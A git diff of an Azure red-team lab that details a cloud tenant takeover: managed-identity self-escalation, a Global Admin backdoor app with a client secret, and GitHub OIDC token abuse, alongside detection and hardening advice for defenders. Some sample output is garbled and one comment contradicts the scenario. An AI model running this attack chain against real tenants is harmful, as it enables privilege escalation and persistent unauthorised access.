@@ -72,14 +72,14 @@ flowchart TD
     A[👤 Anonymous Attacker] -->|DNS Enumeration| B[🌐 Public Blob Container Found]
     B -->|Get-PublicBlobContent -IncludeDeleted| C[📧 Deleted Welcome Email]
     C -->|Extract SAS Token from link| D[🔑 Access to File Share]
-    
+
     D --> E{What's in the storage?}
-    
+
     E -->|Employee Folders| F[👤 Default Passwords]
     E -->|Forgotten /config folder| G[📄 App Secret]
-    
+
     F -->|Login as User| H[Lateral Movement Path]
-    
+
     G -->|Connect-ServicePrincipal| I[🔓 Azure Access]
     I -->|Get-ManagedIdentity| J[🎯 UAMI Discovered]
     J -->|Get-ServicePrincipalsPermission| K[⚠️ AppRoleAssignment.ReadWrite.All]
@@ -160,9 +160,10 @@ timeline
 
 | Permission | Justification Given | Actual Need | Real Risk |
 |------------|---------------------|-------------|----------|
-| `User.ReadWrite.All` | "Create new employee accounts" | ✅ Legitimate | Medium |
-| `Group.ReadWrite.All` | "Add employees to department groups" | ✅ Legitimate | Medium |
-| `AppRoleAssignment.ReadWrite.All` | "Assign new employees to Salesforce, ServiceNow, etc." | ✅ Sounds legitimate | **CRITICAL** |
+| `User.ReadWrite.All` | "Create new employee accounts" |  Legitimate | Medium |
+| `Group.ReadWrite.All` | "Add employees to department groups" |  Legitimate | Medium |
+| `Application.Read.All` | "Read app info to validate assignments" |  Sounds safe (read-only) | Low |
+| `AppRoleAssignment.ReadWrite.All` | "Assign new employees to Salesforce, ServiceNow, etc." |  Sounds legitimate | **CRITICAL** |
 
 **Why `AppRoleAssignment.ReadWrite.All` is so dangerous:**
 
@@ -425,7 +426,7 @@ The recursive enumeration reveals a `/config` directory that was supposed to be 
 # Step 5: The recursive enumeration already revealed everything, including the config folder
 # Look at the output from Step 2 - there's a /config directory!
 
-# Step 6: Enumerate the forgotten config folder  
+# Step 6: Enumerate the forgotten config folder
 Get-FileShareContent -StorageAccountName $storageAccount -FileShareName $fileShare -Path "config" -SasToken $sasToken
 
 # Output:
@@ -464,22 +465,22 @@ Write-Host "Found credentials for App: $clientId in tenant: $tenantId"
 ```mermaid
 flowchart TD
     A[📦 Azure Files Access] --> B{What did we find?}
-    
+
     B --> C[👤 Employee Credentials]
     B --> D[🔑 App Registration Secret]
-    
+
     C --> E[Login as new employee]
     E --> F[Phishing / Data Access / Lateral Movement]
-    
+
     D --> G[Connect-ServicePrincipal]
     G --> H[Enumerate Azure Resources]
     H --> I[Find UAMI with Graph Permissions]
     I --> J[👑 Complete Tenant Takeover]
-    
+
     style D fill:#ffcdd2
     style J fill:#ffcdd2
     style C fill:#fff9c4
-    
+
     linkStyle 3 stroke:#f44336,stroke-width:3px
     linkStyle 4 stroke:#f44336,stroke-width:3px
     linkStyle 5 stroke:#f44336,stroke-width:3px
@@ -533,7 +534,7 @@ Get-RoleAssignment -CurrentUser
 
 # Output:
 # RoleName          Scope                           PrincipalType
-# --------          -----                           -------------
+# --------          -----          -------------
 # Contributor       /subscriptions/a1b2c3d4...      ServicePrincipal
 
 # Contributor on entire subscription = we can modify resources!
@@ -562,24 +563,27 @@ Get-ServicePrincipalsPermission -ServicePrincipalId "197e935d-02a7-4ca3-98a2-a2b
 
 # Output:
 # DisplayName: uami-hr-cicd-automation
-# 
+#
 # Application Permissions:
 #   Permission                              ResourceApp
 #   ----------                              -----------
 #   User.ReadWrite.All                      Microsoft Graph    ← Create employee accounts
-#   Group.ReadWrite.All                     Microsoft Graph    ← Add users to groups  
+#   Group.ReadWrite.All                     Microsoft Graph    ← Add users to groups
+#   Application.Read.All                    Microsoft Graph    ← Read app info for assignments
 #   AppRoleAssignment.ReadWrite.All         Microsoft Graph    ← Assign users to apps
 #
 # Wait... AppRoleAssignment.ReadWrite.All? That sounds harmless...
-# 
+#
 # ⚠️ CRITICAL INSIGHT: AppRoleAssignment.ReadWrite.All is deceptively named!
-# It can:
+# It enables POST /servicePrincipals/{id}/appRoleAssignments, which means:
 #   1. Assign users to applications (the "legitimate" use)
 #   2. Grant ANY Graph API permission to ANY service principal!
-#   3. Including granting RoleManagement.ReadWrite.Directory to ITSELF
+#   3. Including granting Application.ReadWrite.All + RoleManagement.ReadWrite.Directory to ITSELF
 #   = Self-escalation to tenant takeover!
-# 
-# This permission was approved because "HR needs to assign new employees to 
+#
+# Required permission for Set-ManagedIdentityPermission: ✅ AppRoleAssignment.ReadWrite.All (already present!)
+#
+# This permission was approved because "HR needs to assign new employees to
 # Salesforce and ServiceNow". Nobody realized the hidden danger.
 ```
 
@@ -604,8 +608,9 @@ Get-FederatedIdentityCredential -Name "uami-hr-cicd-automation"
 |-----------|-------------|
 | SP has Contributor on subscription | Can modify any Azure resource, including UAMIs |
 | UAMI has `User.ReadWrite.All` + `Group.ReadWrite.All` | Legitimate for HR onboarding |
+| UAMI has `Application.Read.All` | Enables SP lookup - seems harmless but critical for attack |
 | UAMI has `AppRoleAssignment.ReadWrite.All` | **CRITICAL!** Can grant ANY permission to ANY service principal |
-| **Self-Escalation Path** | Use `AppRoleAssignment.ReadWrite.All` → grant itself `RoleManagement.ReadWrite.Directory` → Create app with Global Admin |
+| **Self-Escalation Path** | Use `Application.Read.All` to lookup MS Graph SP + `AppRoleAssignment.ReadWrite.All` to grant permissions |
 | UAMI already has GitHub FIC | Pattern is established, another FIC won't be suspicious |
 
 ### Discussion Points
@@ -630,22 +635,22 @@ Get-FederatedIdentityCredential -Name "uami-hr-cicd-automation"
 ```mermaid
 flowchart TD
     A[🐙 Attacker's GitHub Repository] -->|1. Workflow triggers| B[📜 GitHub OIDC Token]
-    
+
     subgraph Azure["☁️ Azure / Entra ID"]
         C[🔐 UAMI with FIC]
         D[🎫 UAMI Access Token]
         E[📊 Microsoft Graph API]
     end
-    
+
     B -->|2. Token Exchange| C
     C -->|3. Issues token with| D
     D -->|4. Has AppRoleAssignment.ReadWrite.All| E
-    
+
     subgraph Escalation["⬆️ Self-Escalation"]
         S1[Set-ManagedIdentityPermission]
         S2[Grant RoleManagement.ReadWrite.Directory]
     end
-    
+
     E -->|5. Escalate permissions| S1
     S1 --> S2
     S2 -->|6. Now can assign roles| F[Add-EntraApplication]
@@ -736,7 +741,7 @@ jobs:
             -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" | jq -r '.value')
           echo "::add-mask::$OIDC_TOKEN"
           echo "oidc_token=$OIDC_TOKEN" >> $GITHUB_OUTPUT
-      
+
       - name: Exchange for UAMI Token (Graph API scope)
         run: |
           GRAPH_TOKEN=$(curl -sX POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
@@ -746,7 +751,7 @@ jobs:
             -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
             -d "client_assertion=${{ steps.oidc.outputs.oidc_token }}" \
             -d "scope=https://graph.microsoft.com/.default" | jq -r '.access_token')
-          
+
           # Now we have a token with Application.ReadWrite.All!
           echo "Got Graph token for UAMI - ready for Phase 5"
 ```
@@ -770,35 +775,73 @@ jobs:
 
 ## 👑 PHASE 5: Tenant Takeover (5 minutes)
 
+### Step 0: Authenticate with UAMI Token from GitHub Actions Pipeline
+
+The GitHub Actions workflow (exploit.yml) outputs a base64-encoded UAMI token for Graph API. Use `Connect-GraphToken` to authenticate:
+
+```powershell
+# Get the base64-encoded token from the GitHub Actions workflow output
+# (Copy from the workflow logs)
+$b64Token = "ZXlKMGVYQWlPaUpLVjFRaUxDSnViMjVqWlNJNklqTXhVakpNTm1KMlpqTnBNRmR1TjNodU5tMVBPR1Y1ZERkdFpVSnJjVnBrTjFWeFIzaE5OMDE1TTAwaUxDSmhiR2NpT2lKU1V6STFOaUlzSW5nMWRDSTZJbEJqV0RrNFIxZzBNakJVTVZnMmMwSkVhM3BvVVcxeFozZE5WU0lzSW10cFpDSTZJbEJqV0RrNFIxZzBNakJVTVZnMmMwSkVhM3BvVVcxeFozZE5WU0o5Lmv5bGRhMDdmMDk0OGI3MzA4MzZjZGY0YjZkZmIxOGI1OGI5YjE4ODg2MzA1NjM4MjFmNzY2YTdhYmZlNGVlMzc3Mw=="
+
+# Authenticate using Connect-GraphToken with base64-encoded token
+Connect-GraphToken -AccessToken $b64Token -asBase64 -EndpointType MSGraph
+
+# Output shows successful authentication:
+# ✓ Connected to MSGraph as uami-hr-cicd-automation
+#   Endpoint: https://graph.microsoft.com
+#   Permissions: outlincomes-scope:scope:timed-notifications.beta
+#   Token expires: 2026-02-04 21:04:11 UTC
+```
+
+Now all subsequent BlackCat commands will use this authenticated UAMI session.
+
 ### Step 1: Self-Escalation via Set-ManagedIdentityPermission
 
 The UAMI token has `AppRoleAssignment.ReadWrite.All`. This permission can grant **any** Graph API permission to **any** service principal - including itself!
 
 ```powershell
-# After authenticating with the UAMI token from GitHub Actions,
-# First, use BlackCat's Set-ManagedIdentityPermission to escalate the UAMI's own permissions
+# The UAMI is now authenticated via Connect-GraphToken
+# Use BlackCat's Set-ManagedIdentityPermission to escalate the UAMI's own permissions
+
+$uamiId = "197e935d-02a7-4ca3-98a2-a2b0ffc389f6"
+
+# Grant the UAMI the ability to create applications
+Set-ManagedIdentityPermission `
+    -servicePrincipalId $uamiId `
+    -CommonResource MicrosoftGraph `
+    -appRoleName "Application.ReadWrite.All"
 
 # Grant the UAMI the ability to assign directory roles
 Set-ManagedIdentityPermission `
-    -servicePrincipalId "197e935d-02a7-4ca3-98a2-a2b0ffc389f6" `
+    -servicePrincipalId $uamiId `
     -CommonResource MicrosoftGraph `
     -appRoleName "RoleManagement.ReadWrite.Directory"
 
-# The UAMI just granted ITSELF the permission to assign Global Admin!
+# The UAMI just granted ITSELF both permissions needed for complete takeover!
 ```
 
-### Step 2: Create Global Admin Application
+**Why this works:**
+- The UAMI has `Application.Read.All` (granted for "reading app info to validate assignments")
+- This permission allows `Set-ManagedIdentityPermission` to look up the Microsoft Graph service principal
+- Combined with `AppRoleAssignment.ReadWrite.All`, it can grant ANY permission to ANY service principal
+- Including granting powerful permissions to itself!
 
-Now that the UAMI has `RoleManagement.ReadWrite.Directory`, we can use `Add-EntraApplication`:
+### Step 2: Create Enterprise Application for Persistent Access
+
+After the UAMI has granted itself the required permissions (`Application.ReadWrite.All` and `RoleManagement.ReadWrite.Directory`), create an Enterprise Application with Global Administrator role:
 
 ```powershell
+# Now that the UAMI has both Application.ReadWrite.All and RoleManagement.ReadWrite.Directory
+# (granted to itself in Step 1), we can use Add-EntraApplication to create a backdoor app
+
 # Use BlackCat's Add-EntraApplication to create a malicious app with Global Admin
 Add-EntraApplication -DisplayName "Azure-Backup-Automation-Service"
 
 # This function automatically:
-# 1. Creates an App Registration
+# 1. Creates an App Registration (requires Application.ReadWrite.All)
 # 2. Creates a Service Principal
-# 3. Assigns Global Administrator role to the Service Principal
+# 3. Assigns Global Administrator role to the SP (requires RoleManagement.ReadWrite.Directory)
 # 4. Returns the App details for credential creation
 ```
 
@@ -816,25 +859,21 @@ RoleTemplateId              : 62e90394-69f5-4237-9190-012177145e10
 ### Creating Persistence (Client Secret)
 
 ```powershell
-# Add a client secret to the newly created app for persistent access
-# (Manual step - BlackCat function uses role assignment approach)
+# Use BlackCat's Set-ServicePrincipalCredential to add a client secret for persistent access
+Set-ServicePrincipalCredential -ObjectId $app.ApplicationObjectId -Action AddPassword -GenerateSecret
 
-$secretBody = @{
-    passwordCredential = @{
-        displayName = "Backup Key"
-        endDateTime = (Get-Date).AddYears(2).ToString("o")
-    }
-} | ConvertTo-Json
-
-$secret = Invoke-RestMethod `
-    -Uri "https://graph.microsoft.com/v1.0/applications/$appObjectId/addPassword" `
-    -Method POST `
-    -Headers @{ Authorization = "Bearer $graphToken"; "Content-Type" = "application/json" } `
-    -Body $secretBody
+# Output:
+# ObjectId              : abc12345-6789-0def-1234-567890abcdef
+# CredentialType        : Password
+# KeyId                 : 7a8b9c0d-1e2f-3456-7890-abcdef123456
+# DisplayName           : BlackCat-Generated-Secret
+# StartDateTime         : 2026-02-02T10:30:00Z
+# EndDateTime           : 2028-02-02T10:30:00Z
+# SecretText            : Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2
 
 # Now attacker has persistent access via:
 # - ClientId: 9a8b7c6d-5e4f-3210-fedc-ba0987654321
-# - ClientSecret: (returned by addPassword)
+# - ClientSecret: Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2
 # - This app has Global Administrator!
 ```
 
@@ -842,20 +881,75 @@ $secret = Invoke-RestMethod `
 
 | Step | Achievement | Details |
 |------|-------------|---------|
-| **Self-Escalation** | UAMI granted itself `RoleManagement.ReadWrite.Directory` | Using `Set-ManagedIdentityPermission` |
+| **Self-Escalation** | UAMI granted itself `Application.ReadWrite.All` + `RoleManagement.ReadWrite.Directory` | Using `Set-ManagedIdentityPermission` twice |
 | **Global Admin SP** | "Azure-Backup-Automation-Service" with GA role | Created via `Add-EntraApplication` |
-| **Persistent Secret** | 2-year client secret for continued access | Independent of UAMI |
+| **Persistent Secret** | 2-year client secret for continued access | Using `Set-ServicePrincipalCredential` |
 | **Stealthy Name** | Looks like legitimate backup automation | Low suspicion |
 
 ### Persistence Mechanisms Created
 
 | Mechanism | Description | Detection Difficulty |
 |-----------|-------------|---------------------|
-| UAMI Permission Escalation | UAMI now has `RoleManagement.ReadWrite.Directory` | **Low** (visible in audit logs) |
+| UAMI Permission Escalation | UAMI now has `Application.ReadWrite.All` + `RoleManagement.ReadWrite.Directory` | **Low** (visible in audit logs) |
 | Malicious App Registration | "Azure-Backup-Automation-Service" with admin permissions | Medium |
-| Client Secret | 2-year validity, named "Backup Key" | Low (if audited) |
+| Client Secret | 2-year validity, added via `Set-ServicePrincipalCredential` | Low (if audited) |
 | Federated Credential on UAMI | Persistent GitHub → Azure access | Medium |
 | Global Admin Assignment | App's SP is now tenant admin | Easy (if monitored) |
+
+### Step 3: Proof of Compromise - Verify Enterprise Application is Global Admin
+
+Verify that the Enterprise Application was successfully created and has Global Administrator role:
+
+```powershell
+# Still authenticated as UAMI via Connect-GraphToken from Step 0
+# Verify the newly created application has Global Administrator role
+
+# Check if the new app is in the Global Administrators role
+Get-EntraRoleMember -RoleName 'Global Administrator'
+
+# Output:
+# DisplayName                        PrincipalType      DirectoryScopeId
+# -----------                        -------------      ----------------
+# Azure-Backup-Automation-Service    ServicePrincipal   /                  ← We created this! 👑
+# admin@bluemountaintravel.uk        User               /
+# ...
+
+# Get details of the newly created app
+Get-EntraServicePrincipal -Filter "displayName eq 'Azure-Backup-Automation-Service'"
+
+# Output shows:
+# DisplayName                  : Azure-Backup-Automation-Service
+# Id                           : def98765-4321-0fed-cba9-876543210fed
+# AppId                        : 9a8b7c6d-5e4f-3210-fedc-ba0987654321
+# ServicePrincipalType         : Application
+```
+
+### Step 4: Verify Persistence via Backdoor App
+
+Now connect with the newly created backdoor application to confirm persistent access:
+
+```powershell
+# Disconnect from UAMI session
+Disconnect-ServicePrincipal
+
+# Connect with the newly created backdoor credentials
+Connect-ServicePrincipal `
+    -ServicePrincipalId "9a8b7c6d-5e4f-3210-fedc-ba0987654321" `
+    -TenantId "67f8647a-6555-4c70-bee4-45625d332c3f" `
+    -ClientSecret "Kvj8Q~9pL2mN4wR8vB3cH6jK1fE5gT0yU.aI7dO2"
+
+# Verify our identity - we're now the backdoor service principal
+Get-EntraInformation -CurrentUser
+
+# Output:
+# DisplayName                  : Azure-Backup-Automation-Service
+# Id                           : def98765-4321-0fed-cba9-876543210fed
+# AppId                        : 9a8b7c6d-5e4f-3210-fedc-ba0987654321
+# ServicePrincipalType         : Application
+
+# 🎉 ATTACK COMPLETE - We have persistent Global Admin access via the backdoor app!
+# Even if the UAMI is deleted, we still have full control via this application!
+```
 
 ### Discussion Points
 - Why is creating a new App more stealthy than modifying existing ones?
@@ -868,7 +962,7 @@ $secret = Invoke-RestMethod `
 | Detection | Log Source | Alert Priority |
 |-----------|------------|----------------|
 | New App Registration | Entra ID Audit Logs | Critical |
-| Global Admin role assignment | Entra ID Audit Logs | Critical |
+| Global Admin role assignment to new app | Entra ID Audit Logs | Critical |
 | Service principal sign-in from new app | Entra ID Sign-in Logs | High |
 | Client secret added to application | Entra ID Audit Logs | High |
 
@@ -885,7 +979,7 @@ flowchart TD
         P4[Least Privilege UAMIs]
         P5[Azure Policy: Block FIC creation]
     end
-    
+
     subgraph Detection["🔍 Detection Layer"]
         D1[Storage Analytics Logs]
         D2[Azure Activity Logs]
@@ -893,7 +987,7 @@ flowchart TD
         D4[Entra ID Sign-in Logs]
         D5[Microsoft Sentinel Rules]
     end
-    
+
     subgraph Response["⚡ Response Layer"]
         R1[Revoke SAS Tokens]
         R2[Rotate Storage Keys]
@@ -901,14 +995,14 @@ flowchart TD
         R4[Remove FIC from UAMI]
         R5[Forensic Investigation]
     end
-    
+
     P1 & P2 --> |"If bypassed"| D1 & D2
     P3 & P4 --> |"If bypassed"| D3 & D4
     P5 --> |"If bypassed"| D2 & D3
-    
+
     D1 & D2 & D3 & D4 --> D5
     D5 --> |"Alert triggers"| R1 & R2 & R3 & R4 & R5
-    
+
     style Prevention fill:#90EE90
     style Detection fill:#FFD700
     style Response fill:#FF6B6B
@@ -974,9 +1068,11 @@ AuditLogs
 1. **SAS tokens are credentials** - Treat them like passwords, audit their permissions with `Read-SASToken`
 2. **Soft-delete ≠ secure delete** - Retention policies don't protect from enumeration
 3. **Reconnaissance matters** - Use `Get-RoleAssignment`, `Get-ManagedIdentity`, `Get-ServicePrincipalsPermission` to understand attacker perspective
-4. **UAMI permissions are dangerous** - `Application.ReadWrite.All` enables tenant takeover
-5. **Federated credentials create trust** - Monitor additions, restrict who can create them
-6. **Detection must be multi-layer** - Storage, Azure Activity, Entra ID all have signals
+4. **UAMI permissions are dangerous** - `AppRoleAssignment.ReadWrite.All` + `Application.Read.All` enables tenant takeover via self-escalation
+5. **Self-escalation is real** - A UAMI with `AppRoleAssignment.ReadWrite.All` can grant itself any Graph API permission, including `Application.ReadWrite.All` and `RoleManagement.ReadWrite.Directory`
+6. **Federated credentials create trust** - Monitor additions, restrict who can create them. Any GitHub repo trusted by a UAMI can obtain tokens with the UAMI's permissions
+7. **Detection must be multi-layer** - Storage, Azure Activity, Entra ID all have signals. Monitor permission grants, app registrations, and role assignments
+8. **Token validation matters** - Expired tokens should be rejected immediately. Use tools like `Connect-GraphToken` that validate expiration before use
 
 ### For Red Teams
 
@@ -984,15 +1080,28 @@ AuditLogs
 2. **Use BlackCat for enumeration** - `Connect-ServicePrincipal` → `Get-RoleAssignment` → `Get-ManagedIdentity` → `Get-ServicePrincipalsPermission`
 3. **Permission boundary crossing** - Contributor (Azure RBAC) + UAMI with Graph permissions = Entra ID access
 4. **GitHub OIDC is stealthy** - `Set-FederatedIdentity` creates persistent access without stored secrets
-5. **`Add-EntraApplication`** - Creates app + SP + Global Admin in one command
+5. **Self-escalation workflow** - Use `Set-ManagedIdentityPermission` to grant a UAMI powerful permissions to itself before creating backdoor apps
+6. **Connect-GraphToken for UAMI tokens** - Use `Connect-GraphToken -asBase64` to authenticate with base64-encoded tokens from pipelines. Validates token expiration automatically
+7. **Enterprise Applications for persistence** - `Add-EntraApplication` creates app + SP + Global Admin in one command. The resulting Enterprise Application provides long-term backdoor access
+8. **Token transport via base64** - Encode tokens in base64 to avoid log truncation and special character issues in CI/CD pipelines
 
 ### For Architects
 
 1. **Use service-level SAS** - Not account/share level with list permissions
 2. **Private endpoints** - Eliminate anonymous access to storage entirely
-3. **Least privilege UAMIs** - Separate UAMIs for different purposes, never grant `Application.ReadWrite.All`
-4. **Monitor federated credentials** - Alert on any additions to managed identities
-5. **PIM for Graph permissions** - Require approval for sensitive permission assignments
+3. **Least privilege UAMIs** - Separate UAMIs for different purposes, never grant `AppRoleAssignment.ReadWrite.All` without extensive review and justification
+4. **Monitor federated credentials** - Alert on any additions to managed identities. Implement approval workflows for FIC creation
+5. **PIM for Graph permissions** - Require approval for sensitive permission assignments, especially `Application.ReadWrite.All` and `RoleManagement.ReadWrite.Directory`
+6. **Token lifetime policies** - Configure short token lifetimes for UAMI access tokens to limit exposure window
+7. **Separate creation from elevation** - Don't grant both `Application.ReadWrite.All` and `RoleManagement.ReadWrite.Directory` to the same identity
+
+### For Security Operations
+
+1. **Base64-encoded tokens in logs** - Attackers may base64-encode tokens to evade detection. Look for patterns like "Connect-GraphToken -asBase64"
+2. **Self-service permission grants** - Alert when a service principal grants permissions to itself via `AppRoleAssignment.ReadWrite.All`
+3. **Rapid privilege escalation** - Detect when a new app registration receives Global Admin within minutes of creation
+4. **GitHub OIDC in audit logs** - Federated identity sign-ins from GitHub repos should be validated against authorized repositories
+5. **Enterprise Application monitoring** - New Enterprise Applications (service principals) should be reviewed, especially those with admin roles
 
 ---
 
@@ -1000,16 +1109,25 @@ AuditLogs
 
 | Phase | Function | Purpose |
 |-------|----------|---------|
-| 1 | `Find-SubDomain` | Discover Azure resources via DNS |
-| 1 | `Find-DnsRecords` | Enumerate DNS records |
-| 1 | `Find-PublicStorageContainer` | Find publicly accessible storage |
-| 1 | `Read-SASToken` | Analyze SAS token permissions |
-| 3 | `Connect-ServicePrincipal` | Authenticate with stolen credentials |
-| 3 | `Get-RoleAssignment` | Discover RBAC permissions |
-| 3 | `Get-ManagedIdentity` | Enumerate UAMIs |
-| 3 | `Get-ServicePrincipalsPermission` | Check Graph API permissions |
-| 4 | `Set-FederatedIdentity` | Add GitHub OIDC trust to UAMI |
-| 5 | `Add-EntraApplication` | Create app with Global Admin |
+| 1 | `Find-DnsRecords` | Enumerate DNS records for target domain |
+| 1 | `Find-AzurePublicResource` | Discover Azure resources via DNS |
+| 1 | `Find-PublicStorageContainer` | Find publicly accessible storage containers |
+| 1 | `Get-PublicBlobContent` | List and download blobs, including deleted versions |
+| 1 | `Read-SASToken` | Analyze SAS token permissions and expiration |
+| 2 | `Get-FileShareContent` | Enumerate Azure Files share contents via SAS token |
+| 3 | `Connect-ServicePrincipal` | Authenticate with stolen App Registration credentials |
+| 3 | `Get-RoleAssignment` | Discover Azure RBAC role assignments |
+| 3 | `Get-ManagedIdentity` | Enumerate User-Assigned Managed Identities |
+| 3 | `Get-ServicePrincipalsPermission` | Check Microsoft Graph API permissions |
+| 4 | `Set-FederatedIdentity` | Add GitHub OIDC federated credential to UAMI |
+| 5 | `Connect-GraphToken` | Authenticate with base64-encoded UAMI token from pipeline |
+| 5 | `Set-ManagedIdentityPermission` | Grant Graph API permissions to UAMI (self-escalation) |
+| 5 | `Add-EntraApplication` | Create Enterprise Application with Global Admin role |
+| 5 | `Set-ServicePrincipalCredential` | Add client secret for persistent access |
+| 5 | `Get-EntraRoleMember` | Verify Global Administrator role assignments |
+| 5 | `Get-EntraServicePrincipal` | Verify Enterprise Application creation |
+| 5 | `Get-EntraInformation` | Verify current authenticated identity |
+| 5 | `Disconnect-ServicePrincipal` | Disconnect from current service principal session |
 
 ---
 
